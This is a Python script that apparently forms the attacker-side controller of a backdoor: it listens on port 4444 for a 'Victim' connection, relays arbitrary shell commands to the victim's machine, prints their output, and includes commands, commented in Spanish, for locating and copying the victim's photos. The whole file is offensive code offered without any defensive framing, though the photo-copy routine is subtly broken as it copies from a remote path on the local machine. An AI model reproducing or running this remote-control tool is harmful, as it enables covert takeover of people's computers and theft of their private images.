import socket
import subprocess
import os
import shutil

Attacker_IP = '10.93.94.171'
PORT = 4444

server = socket.socket()
server.bind((Attacker_IP, PORT))
print('Server Created!')
print('Listening...')
server.listen(1)

Victim, Victim_IP = server.accept()
print('Victim opened the backdoor! IP: ' + Victim_IP[0])

while True:
    command = input('Enter Command : ')
    command = command.encode()
    if command.decode() == 'open_photos_folder':
        # Solicitar al cliente la ubicación de la carpeta de fotos
        Victim.send('send_photos_folder_location'.encode())
        photos_folder_location = Victim.recv(1024).decode()
        
        # Abrir la carpeta de fotos en el sistema operativo Windows
        os.system('start "" "' + photos_folder_location + '"')
    elif command.decode().startswith('copy_photos'):
        # Solicitar al cliente la ubicación de la carpeta de fotos
        Victim.send('send_photos_folder_location'.encode())
        photos_folder_location = Victim.recv(1024).decode()
        
        destination_folder = command.decode().split(' ')[1]  # Obtener la ruta de destino especificada por el atacante
        
        # Verificar si la carpeta de destino existe, si no, crearla
        if not os.path.exists(destination_folder):
            os.makedirs(destination_folder)
        
        # Copiar todas las fotos de la carpeta de fotos a la carpeta de destino
        for filename in os.listdir(photos_folder_location):
            if filename.endswith('.jpg') or filename.endswith('.png'):  # Filtrar solo archivos de imagen
                shutil.copy(os.path.join(photos_folder_location, filename), destination_folder)
                print('Copied:', filename)
    else:
        Victim.send(command)
        print('Command sent to ' + Victim_IP[0])
    
        output = Victim.recv(1024)
        output = output.decode()
        print("Output: " + output)